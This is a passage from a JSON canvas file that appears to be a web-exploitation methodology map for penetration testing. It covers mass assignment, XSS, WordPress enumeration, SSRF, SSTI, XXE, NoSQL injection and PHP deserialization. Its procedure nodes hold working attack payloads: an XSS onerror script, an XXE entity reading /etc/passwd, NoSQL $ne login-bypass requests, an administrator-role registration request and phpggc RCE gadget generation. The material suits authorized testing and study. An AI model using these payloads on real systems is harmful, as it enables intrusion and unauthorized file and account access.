    {
      "id": "method:web-mass-assignment:interpret",
      "type": "text",
      "x": 6180,
      "y": 25363,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nReturned owner/role fields identify properties to investigate; they are not evidence that the server binds them on update.",
      "color": "6"
    },
    {
      "id": "method:web-mass-assignment:validate",
      "type": "text",
      "x": 6180,
      "y": 25609,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nCheck accepted writable fields, independent persistence and a resulting permission change.",
      "color": "2"
    },
    {
      "id": "method:web-mass-assignment:enabled",
      "type": "text",
      "x": 6960,
      "y": 25313,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nA lower user changes the protected property and gains the verified action: select mass assignment.\n\n**Verify:** Independently reread the object and demonstrate the resulting permitted action under the same account.\n\n[[notes/web-exploitation.md#web-mass-assignment|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-mass-assignment:ruledout",
      "type": "text",
      "x": 6960,
      "y": 25654,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe sensitive field is ignored or authorization state remains unchanged: reject that property route.",
      "color": "1"
    },
    {
      "id": "method:web-mass-assignment:unknown",
      "type": "text",
      "x": 6960,
      "y": 25875,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nThe response merely echoes submitted JSON: reread state before drawing a conclusion.",
      "color": "2"
    },
    {
      "id": "method:web-mass-assignment:action",
      "type": "text",
      "x": 7810,
      "y": 25313,
      "width": 900,
      "height": 252,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\ncurl -ski -X POST -H 'Content-Type: application/json' -d '{\"username\":\"TEST_USER\",\"password\":\"TEST_PASSWORD\",\"role\":\"administrator\"}' http://TARGET:PORT/api/v1/register\n```\n\n[[notes/web-exploitation.md#web-mass-assignment|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-mass-assignment:next-0",
      "type": "text",
      "x": 7810,
      "y": 25655,
      "width": 620,
      "height": 276,
      "text": "### Cross role, function or session authorization boundaries\n\n**When:** Administrative actions/routes or request methods visible from a lower role\n\n**Still required:** The lower-role identity can invoke a protected server-side action without its required authorization\n\n**Cross role, function or session authorization boundaries — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-mass-assignment:next-1",
      "type": "text",
      "x": 7810,
      "y": 25986,
      "width": 620,
      "height": 276,
      "text": "### Use WordPress component evidence and authorized administration features\n\n**When:** WordPress paths/components or an accepted application administrator credential\n\n**Still required:** Exact component/version or a verified role; file-edit/plugin installation rights and runtime write/execution must be checked\n\n**Use WordPress component evidence and authorized administration features — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-mass-assignment:next-2",
      "type": "text",
      "x": 7810,
      "y": 26317,
      "width": 620,
      "height": 276,
      "text": "### Map functions, roles and normal requests manually\n\n**When:** Forms, downloads, exports, account functions or role-specific interfaces\n\n**Still required:** A normal request baseline and the relevant account/role; authorized accounts for role comparisons\n\n**Map functions, roles and normal requests manually — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-xss:start",
      "type": "text",
      "x": 4750,
      "y": 26948,
      "width": 350,
      "height": 250,
      "text": "## Execute browser code and validate a useful same-origin action\n\nUntrusted input reaches an executable HTML/JavaScript context",
      "color": "5"
    },
    {
      "id": "method:web-xss:discover",
      "type": "text",
      "x": 5250,
      "y": 26908,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -skG --data-urlencode 'PARAM=UNIQUE_MARKER' http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:web-xss:interpret",
      "type": "text",
      "x": 6180,
      "y": 26888,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nThe output context and escaping determine whether browser execution is plausible; the second form is escaped text.",
      "color": "6"
    },
    {
      "id": "method:web-xss:validate",
      "type": "text",
      "x": 6180,
      "y": 27134,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nVerify the actual browser sink/execution, victim origin/role, required interaction and useful authorized same-origin action.",
      "color": "2"
    },
    {
      "id": "method:web-xss:enabled",
      "type": "text",
      "x": 6960,
      "y": 26838,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nBrowser execution and the specific privileged action are independently confirmed: choose the appropriate XSS chain.\n\n**Verify:** Verify execution in the intended origin/role and independently verify any claimed action; reflection alone is not execution.\n\n[[notes/web-exploitation.md#web-xss|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-xss:ruledout",
      "type": "text",
      "x": 6960,
      "y": 27179,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe value remains inert/escaped in the relevant sink: reject that payload/context.",
      "color": "1"
    },
    {
      "id": "method:web-xss:unknown",
      "type": "text",
      "x": 6960,
      "y": 27400,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nSource reflection without DOM execution evidence leaves the browser effect unknown.",
      "color": "2"
    },
    {
      "id": "method:web-xss:action",
      "type": "text",
      "x": 7810,
      "y": 26838,
      "width": 900,
      "height": 228,
      "text": "### Procedure entry — full sequence in the note\n\n```html\n<img src=x onerror=alert(document.domain)>\n```\n\n[[notes/web-exploitation.md#web-xss|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-xss:next-0",
      "type": "text",
      "x": 7810,
      "y": 27156,
      "width": 620,
      "height": 276,
      "text": "### Cross role, function or session authorization boundaries\n\n**When:** Administrative actions/routes or request methods visible from a lower role\n\n**Still required:** The lower-role identity can invoke a protected server-side action without its required authorization\n\n**Cross role, function or session authorization boundaries — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-xss:next-1",
      "type": "text",
      "x": 7810,
      "y": 27487,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:web-xss:next-2",
      "type": "text",
      "x": 7810,
      "y": 27818,
      "width": 620,
      "height": 276,
      "text": "### Map functions, roles and normal requests manually\n\n**When:** Forms, downloads, exports, account functions or role-specific interfaces\n\n**Still required:** A normal request baseline and the relevant account/role; authorized accounts for role comparisons\n\n**Map functions, roles and normal requests manually — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-cms:start",
      "type": "text",
      "x": 4750,
      "y": 28449,
      "width": 350,
      "height": 250,
      "text": "## Use WordPress component evidence and authorized administration features\n\nWordPress paths/components or an accepted application administrator credential",
      "color": "5"
    },
    {
      "id": "method:web-cms:discover",
      "type": "text",
      "x": 5250,
      "y": 28409,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sk -i http://TARGET:PORT/wp-login.php\n```"
    },
    {
      "id": "method:web-cms:interpret",
      "type": "text",
      "x": 6180,
      "y": 28389,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nProduct/component and role clues guide two different paths: exact component exploit matching or a permitted administrative feature.",
      "color": "6"
    },
    {
      "id": "method:web-cms:validate",
      "type": "text",
      "x": 6180,
      "y": 28635,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nVerify build/configuration for a CVE, or actual editor/plugin/file rights plus executable handling for a feature chain.",
      "color": "2"
    },
    {
      "id": "method:web-cms:enabled",
      "type": "text",
      "x": 6960,
      "y": 28339,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nThe precise vulnerable feature or permitted file-consumer route is established: select that mechanism.\n\n**Verify:** Verify application role and any produced execution identity; component names alone do not establish a vulnerable version.\n\n[[notes/web-exploitation.md#web-cms|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-cms:ruledout",
      "type": "text",
      "x": 6960,
      "y": 28680,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe account lacks the relevant capability and files are read-only: discard the assumed dashboard-to-shell route.",
      "color": "1"
    },
    {
      "id": "method:web-cms:unknown",
      "type": "text",
      "x": 6960,
      "y": 28901,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nA product path without exact version/feature evidence is insufficient for a public exploit.",
      "color": "2"
    },
    {
      "id": "method:web-cms:action",
      "type": "text",
      "x": 7810,
      "y": 28339,
      "width": 900,
      "height": 324,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\ncurl -skI https://HOSTNAME/\ncurl -sk https://HOSTNAME/robots.txt\ncurl -sk https://HOSTNAME/wp-json/ | head\ncurl -sk https://HOSTNAME/wp-content/\ncurl -sk https://HOSTNAME/wp-login.php -o wp-login.html\n```\n\n[[notes/web-exploitation.md#web-cms|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-cms:next-0",
      "type": "text",
      "x": 7810,
      "y": 28753,
      "width": 620,
      "height": 252,
      "text": "### Match a public exploit to the actual component and configuration\n\n**When:** A product/version clue, advisory or component-specific public PoC\n\n**Still required:** Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect\n\n[[tracks/04 Public Exploits.canvas|Match a public exploit to the actual component and configuration → 04 Public Exploits]]",
      "color": "5"
    },
    {
      "id": "method:web-cms:next-1",
      "type": "text",
      "x": 7810,
      "y": 29060,
      "width": 620,
      "height": 252,
      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n[[tracks/06 Shells and Transfers.canvas|Verify command execution, host and represented identity → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-cms:next-2",
      "type": "text",
      "x": 7810,
      "y": 29367,
      "width": 620,
      "height": 252,
      "text": "### Validate known passwords and context-specific reuse\n\n**When:** A password tied to a plausible user and service\n\n**Still required:** Correct local/domain/application identity, reachable compatible service, accepted authentication and account state\n\n[[tracks/05 Credentials.canvas|Validate known passwords and context-specific reuse → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:web-ssrf:start",
      "type": "text",
      "x": 4750,
      "y": 29974,
      "width": 350,
      "height": 250,
      "text": "## Use server-side requests to inspect reachable internal behavior\n\nURL import, preview, webhook or fetch behavior",
      "color": "5"
    },
    {
      "id": "method:web-ssrf:discover",
      "type": "text",
      "x": 5250,
      "y": 29934,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -skG --data-urlencode 'url=http://LHOST:PORT/FETCH_CANARY' http://TARGET:PORT/FETCH_PATH\n```"
    },
    {
      "id": "method:web-ssrf:interpret",
      "type": "text",
      "x": 6180,
      "y": 29914,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA correlated receiver event supports server-side fetching; it does not establish internal access or response-readable SSRF.",
      "color": "6"
    },
    {
      "id": "method:web-ssrf:validate",
      "type": "text",
      "x": 6180,
      "y": 30160,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nSeparate client-side fetches, server source, destination/protocol restrictions and response visibility.",
      "color": "2"
    },
    {
      "id": "method:web-ssrf:checks",
      "type": "text",
      "x": 5250,
      "y": 30174,
      "width": 780,
      "height": 132,
      "text": "### Validate the condition\n\n```bash\ncurl -skG --data-urlencode 'url=http://LHOST:PORT/SSRF_CANARY' http://TARGET:PORT/FETCH_PATH\n```"
    },
    {
      "id": "method:web-ssrf:enabled",
      "type": "text",
      "x": 6960,
      "y": 29864,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nA permitted controlled internal request and its bounded result are confirmed: use that specific server-request primitive.\n\n**Verify:** Verify source/request evidence and the exact returned internal behavior; separate blind fetches from response-readable SSRF.\n\n[[notes/web-exploitation.md#web-ssrf|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-ssrf:ruledout",
      "type": "text",
      "x": 6960,
      "y": 30205,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe browser fetches directly and the server never requests it: reject server-side request inference.",
      "color": "1"
    },
    {
      "id": "method:web-ssrf:unknown",
      "type": "text",
      "x": 6960,
      "y": 30426,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nNo receiver event can mean URL validation, DNS or egress; identify the first failed boundary.",
      "color": "2"
    },
    {
      "id": "method:web-ssrf:action",
      "type": "text",
      "x": 7810,
      "y": 29864,
      "width": 900,
      "height": 228,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\npython3 -m http.server LPORT --bind 0.0.0.0\n```\n\n[[notes/web-exploitation.md#web-ssrf|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-ssrf:next-0",
      "type": "text",
      "x": 7810,
      "y": 30182,
      "width": 620,
      "height": 252,
      "text": "### Establish scheme, host, redirects and request state\n\n**When:** An HTTP endpoint, redirect or hostname-dependent response\n\n**Still required:** Correct scheme/port and virtual host; saved cookies/headers for authenticated comparisons\n\n**Establish scheme, host, redirects and request state — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-ssrf:next-1",
      "type": "text",
      "x": 7810,
      "y": 30489,
      "width": 620,
      "height": 276,
      "text": "### Validate RDP, WinRM, VNC and Telnet access contexts\n\n**When:** An exposed remote-access application and compatible known credentials\n\n**Still required:** Enabled destination service, matching authentication and protocol-specific logon/session rights\n\n[[tracks/02 Services.canvas|Validate RDP, WinRM, VNC and Telnet access contexts → 02 Services]]",
      "color": "5"
    },
    {
      "id": "method:web-ssrf:next-2",
      "type": "text",
      "x": 7810,
      "y": 30820,
      "width": 620,
      "height": 252,
      "text": "### Discover pivot interfaces, routes and internal service context\n\n**When:** A foothold exposes an interface/subnet or a loopback-only service\n\n**Still required:** A usable pivot process/identity and explicit scope; both forward and return directions must be understood\n\n[[tracks/10 Pivoting.canvas|Discover pivot interfaces, routes and internal service context → 10 Pivoting]]",
      "color": "5"
    },
    {
      "id": "method:web-ssti:start",
      "type": "text",
      "x": 4750,
      "y": 31427,
      "width": 350,
      "height": 250,
      "text": "## Prove server-side template evaluation and identify its engine\n\nControlled input appears in a server-rendered template, preview, email or report",
      "color": "5"
    },
    {
      "id": "method:web-ssti:discover",
      "type": "text",
      "x": 5250,
      "y": 31387,
      "width": 780,
      "height": 180,
      "text": "### Discover\n\n```text\ncurl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:web-ssti:interpret",
      "type": "text",
      "x": 6180,
      "y": 31367,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA repeatable computed result supports evaluation in that syntax but does not identify the engine or command capability.",
      "color": "6"
    },
    {
      "id": "method:web-ssti:validate",
      "type": "text",
      "x": 6180,
      "y": 31613,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nCorrelate error/source/framework clues and test a discriminating engine expression before selecting objects.",
      "color": "2"
    },
    {
      "id": "method:web-ssti:enabled",
      "type": "text",
      "x": 6960,
      "y": 31317,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nOne engine family and its exposed primitive are confirmed: choose the matching bounded method.\n\n**Verify:** Require repeatable computed output and corroborating engine clues; the value 49 alone does not identify the engine.\n\n[[notes/web-exploitation.md#web-ssti|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-ssti:ruledout",
      "type": "text",
      "x": 6960,
      "y": 31658,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nAll candidate syntax remains literal in the actual rendered sink: reject SSTI there.",
      "color": "1"
    },
    {
      "id": "method:web-ssti:unknown",
      "type": "text",
      "x": 6960,
      "y": 31879,
      "width": 620,
      "height": 132,
      "text": "### Evidence inconclusive\n\nA syntax error alone leaves parser identity and exploitability unresolved.",
      "color": "2"
    },
    {
      "id": "method:web-ssti:action",
      "type": "text",
      "x": 7810,
      "y": 31317,
      "width": 900,
      "height": 396,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\n# Jinja/Twig-style expression probe\ncurl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH\n\n# A different delimiter family, only when the first is literal or errors suggest it\ncurl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH\n\n# Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation\ncurl -sS -G --data-urlencode \"name={{7*'7'}}\" http://TARGET:PORT/PATH\n```\n\n[[notes/web-exploitation.md#web-ssti|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-ssti:next-0",
      "type": "text",
      "x": 7810,
      "y": 31803,
      "width": 620,
      "height": 276,
      "text": "### Prove visible or blind operating-system command injection\n\n**When:** An input appears in a command-like operation or causes shell-dependent behavior\n\n**Still required:** Input reaches command execution with an exploitable parsing boundary; process identity/runtime can perform the selected proof\n\n**Prove visible or blind operating-system command injection — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-ssti:next-1",
      "type": "text",
      "x": 7810,
      "y": 32134,
      "width": 620,
      "height": 276,
      "text": "### Read files through directory traversal\n\n**When:** A download/path parameter or URL segment influences a local filename\n\n**Still required:** Untrusted path reaches a filesystem read outside its intended directory; process identity can read the requested file\n\n**Read files through directory traversal — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-ssti:next-2",
      "type": "text",
      "x": 7810,
      "y": 32465,
      "width": 620,
      "height": 252,
      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n[[tracks/06 Shells and Transfers.canvas|Verify command execution, host and represented identity → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-xxe:start",
      "type": "text",
      "x": 4750,
      "y": 33072,
      "width": 350,
      "height": 250,
      "text": "## Use an XML parser's external-entity behavior for bounded file read\n\nA working XML request reaches a server-side parser that accepts a controlled document or field",
      "color": "5"
    },
    {
      "id": "method:web-xxe:discover",
      "type": "text",
      "x": 5250,
      "y": 33032,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\ncurl -i -b cookies.txt -H 'Content-Type: application/xml' --data-binary @xxe.xml http://TARGET:PORT/PATH\n```"
    },
    {
      "id": "method:web-xxe:interpret",
      "type": "text",
      "x": 6180,
      "y": 33012,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nThe server parser resolved the entity and read the selected file under its process identity.",
      "color": "6"
    },
    {
      "id": "method:web-xxe:validate",
      "type": "text",
      "x": 6180,
      "y": 33258,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nRepeat with a benign control and preserve the exact parser/content-type context.",
      "color": "2"
    },
    {
      "id": "method:web-xxe:enabled",
      "type": "text",
      "x": 6960,
      "y": 32962,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nRecognizable content or a uniquely correlated parser event appears: use the bounded file/network primitive.\n\n**Verify:** Require recognizable file content or a uniquely correlated parser-side event, not an echoed request.\n\n[[notes/web-exploitation.md#web-xxe|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-xxe:ruledout",
      "type": "text",
      "x": 6960,
      "y": 33303,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nThe parser rejects DTDs/entities: reject that entity path in this configuration.",
      "color": "1"
    },
    {
      "id": "method:web-xxe:unknown",
      "type": "text",
      "x": 6960,
      "y": 33524,
      "width": 620,
      "height": 132,
      "text": "### Evidence inconclusive\n\nEchoed XML or a generic parser error does not establish entity resolution.",
      "color": "2"
    },
    {
      "id": "method:web-xxe:action",
      "type": "text",
      "x": 7810,
      "y": 32962,
      "width": 900,
      "height": 276,
      "text": "### Procedure entry — full sequence in the note\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE request [<!ENTITY probe SYSTEM \"file:///etc/passwd\">]>\n<request><value>&probe;</value></request>\n```\n\n[[notes/web-exploitation.md#web-xxe|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-xxe:next-0",
      "type": "text",
      "x": 7810,
      "y": 33328,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:web-xxe:next-1",
      "type": "text",
      "x": 7810,
      "y": 33659,
      "width": 620,
      "height": 276,
      "text": "### Inspect source, backups, configuration and repository artifacts\n\n**When:** JavaScript endpoints, backup names, exposed configuration or Git metadata\n\n**Still required:** Readable application artifact or a complete recoverable repository; preserve the public-source scope\n\n**Inspect source, backups, configuration and repository artifacts — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-xxe:next-2",
      "type": "text",
      "x": 7810,
      "y": 33990,
      "width": 620,
      "height": 276,
      "text": "### Use server-side requests to inspect reachable internal behavior\n\n**When:** URL import, preview, webhook or fetch behavior\n\n**Still required:** The application server performs a controllable request; destination/protocol policy and its network position permit the selected resource\n\n**Use server-side requests to inspect reachable internal behavior — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-nosql:start",
      "type": "text",
      "x": 4750,
      "y": 34621,
      "width": 350,
      "height": 250,
      "text": "## Test structured NoSQL operator injection with identity controls\n\nA login or search accepts JSON/nested form properties and evidence suggests an operator-based document query",
      "color": "5"
    },
    {
      "id": "method:web-nosql:discover",
      "type": "text",
      "x": 5250,
      "y": 34581,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\ncurl -i -c cookies.txt -H 'Content-Type: application/json' --data '{\"username\":\"USER\",\"password\":{\"$ne\":\"\"}}' http://TARGET:PORT/LOGIN\n```"
    },
    {
      "id": "method:web-nosql:interpret",
      "type": "text",
      "x": 6180,
      "y": 34561,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nA structured operator changed the query and produced an authenticated state for the named identity.",
      "color": "6"
    },
    {
      "id": "method:web-nosql:validate",
      "type": "text",
      "x": 6180,
      "y": 34807,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nVerify protected access and identity; ensure the framework parsed an object rather than a string.",
      "color": "2"
    },
    {
      "id": "method:web-nosql:enabled",
      "type": "text",
      "x": 6960,
      "y": 34511,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nThe operator object alone yields the intended verified transition: select the NoSQL method.\n\n**Verify:** Verify a protected action and resulting identity; a 200 status or cookie alone is not authentication.\n\n[[notes/web-exploitation.md#web-nosql|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-nosql:ruledout",
      "type": "text",
      "x": 6960,
      "y": 34852,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nSchema/type validation rejects objects or the password is compared outside the query: reject that route.",
      "color": "1"
    },
    {
      "id": "method:web-nosql:unknown",
      "type": "text",
      "x": 6960,
      "y": 35073,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nA 200 response, cookie or changed error without protected access remains inconclusive.",
      "color": "2"
    },
    {
      "id": "method:web-nosql:action",
      "type": "text",
      "x": 7810,
      "y": 34511,
      "width": 900,
      "height": 372,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\n# A known username with an operator-valued password\ncurl -i -c cookies.txt -H 'Content-Type: application/json' \\\n  --data '{\"username\":\"USER\",\"password\":{\"$ne\":\"\"}}' http://TARGET:PORT/LOGIN\n\n# Distinct context: a form parser that expands bracketed properties\ncurl -i -c cookies.txt --data-urlencode 'username=USER' \\\n  --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN\n```\n\n[[notes/web-exploitation.md#web-nosql|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-nosql:next-0",
      "type": "text",
      "x": 7810,
      "y": 34973,
      "width": 620,
      "height": 276,
      "text": "### Map functions, roles and normal requests manually\n\n**When:** Forms, downloads, exports, account functions or role-specific interfaces\n\n**Still required:** A normal request baseline and the relevant account/role; authorized accounts for role comparisons\n\n**Map functions, roles and normal requests manually — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-nosql:next-1",
      "type": "text",
      "x": 7810,
      "y": 35304,
      "width": 620,
      "height": 276,
      "text": "### Cross role, function or session authorization boundaries\n\n**When:** Administrative actions/routes or request methods visible from a lower role\n\n**Still required:** The lower-role identity can invoke a protected server-side action without its required authorization\n\n**Cross role, function or session authorization boundaries — on this canvas**",
      "color": "5"
    },
    {
      "id": "method:web-nosql:next-2",
      "type": "text",
      "x": 7810,
      "y": 35635,
      "width": 620,
      "height": 276,
      "text": "### Classify the artifact and its identity context\n\n**When:** A secret-like value, key file, stored hash, challenge response or ticket\n\n**Still required:** Artifact provenance and format; possible local/domain/application identity and compatible protocol\n\n[[tracks/05 Credentials.canvas|Classify the artifact and its identity context → 05 Credentials]]",
      "color": "5"
    },
    {
      "id": "method:web-php-deserialization:start",
      "type": "text",
      "x": 4750,
      "y": 36266,
      "width": 350,
      "height": 250,
      "text": "## Match PHP deserialization gadgets to installed dependencies\n\nSource or request evidence shows controlled serialized PHP data reaches unsafe unserialize",
      "color": "5"
    },
    {
      "id": "method:web-php-deserialization:discover",
      "type": "text",
      "x": 5250,
      "y": 36226,
      "width": 780,
      "height": 204,
      "text": "### Discover\n\n```text\nphpggc -l\nphpggc -i Monolog/RCE1\n```"
    },
    {
      "id": "method:web-php-deserialization:interpret",
      "type": "text",
      "x": 6180,
      "y": 36206,
      "width": 580,
      "height": 156,
      "text": "### What the output establishes\n\nThe sink and loaded class family supply a gadget-chain candidate; generation alone is not execution.",
      "color": "6"
    },
    {
      "id": "method:web-php-deserialization:validate",
      "type": "text",
      "x": 6180,
      "y": 36452,
      "width": 580,
      "height": 156,
      "text": "### Missing prerequisite\n\nMatch exact version/vector, preserve serialized lengths/encoding and verify one benign effect.",
      "color": "2"
    },
    {
      "id": "method:web-php-deserialization:checks",
      "type": "text",
      "x": 5250,
      "y": 36490,
      "width": 780,
      "height": 180,
      "text": "### Validate the condition\n\n```bash\nphpggc -l\nphpggc -i Monolog/RCE1\nphpggc -b Monolog/RCE1 system id > payload.b64\n```"
    },
    {
      "id": "method:web-php-deserialization:enabled",
      "type": "text",
      "x": 6960,
      "y": 36156,
      "width": 620,
      "height": 276,
      "text": "### Condition confirmed\n\nA compatible chain causes the intended effect: select that dependency-specific route.\n\n**Verify:** Require the exact dependency/version, sink and attributable effect; successful payload generation proves none of these.\n\n[[notes/web-exploitation.md#web-php-deserialization|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-php-deserialization:ruledout",
      "type": "text",
      "x": 6960,
      "y": 36497,
      "width": 620,
      "height": 156,
      "text": "### Condition disproved here\n\nRequired classes are absent or allowed-class restrictions apply: reject that chain.",
      "color": "1"
    },
    {
      "id": "method:web-php-deserialization:unknown",
      "type": "text",
      "x": 6960,
      "y": 36718,
      "width": 620,
      "height": 156,
      "text": "### Evidence inconclusive\n\nUnknown decoding or transport corruption must be resolved before interpreting a failed payload.",
      "color": "2"
    },
    {
      "id": "method:web-php-deserialization:action",
      "type": "text",
      "x": 7810,
      "y": 36156,
      "width": 900,
      "height": 348,
      "text": "### Procedure entry — full sequence in the note\n\n```bash\n# Inspect available families and the exact chain's version/vector requirements\nphpggc -l\nphpggc -i Monolog/RCE1\n\n# Example function-call gadget, only when that chain matches the application\nphpggc -b Monolog/RCE1 system id > payload.b64\n```\n\n[[notes/web-exploitation.md#web-php-deserialization|Full note & variants]]",
      "color": "4"
    },
    {
      "id": "method:web-php-deserialization:next-0",
      "type": "text",
      "x": 7810,
      "y": 36594,
      "width": 620,
      "height": 252,
      "text": "### Verify command execution, host and represented identity\n\n**When:** A PoC, injected command or remote client reports execution\n\n**Still required:** A functioning execution primitive and an observable output or controlled side effect\n\n[[tracks/06 Shells and Transfers.canvas|Verify command execution, host and represented identity → 06 Shells and Transfers]]",
      "color": "5"
    },
    {
      "id": "method:web-php-deserialization:next-1",
      "type": "text",
      "x": 7810,
      "y": 36901,
      "width": 620,
      "height": 252,
      "text": "### Match a public exploit to the actual component and configuration\n\n**When:** A product/version clue, advisory or component-specific public PoC\n\n**Still required:** Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect\n\n[[tracks/04 Public Exploits.canvas|Match a public exploit to the actual component and configuration → 04 Public Exploits]]",
      "color": "5"
    },
    {
      "id": "method:web-php-deserialization:next-2",
      "type": "text",
      "x": 7810,
      "y": 37208,
      "width": 620,
      "height": 252,
      "text": "### Repair quoting, encoding and command-length boundaries\n\n**When:** A simple command works while a longer or nested payload fails\n\n**Still required:** Known outer request/template/database parser and inner shell; correct character encoding and transport length\n\n[[tracks/11 Execution Troubleshooting.canvas|Repair quoting, encoding and command-length boundaries → 11 Execution Troubleshooting]]",
      "color": "5"
    },
    {
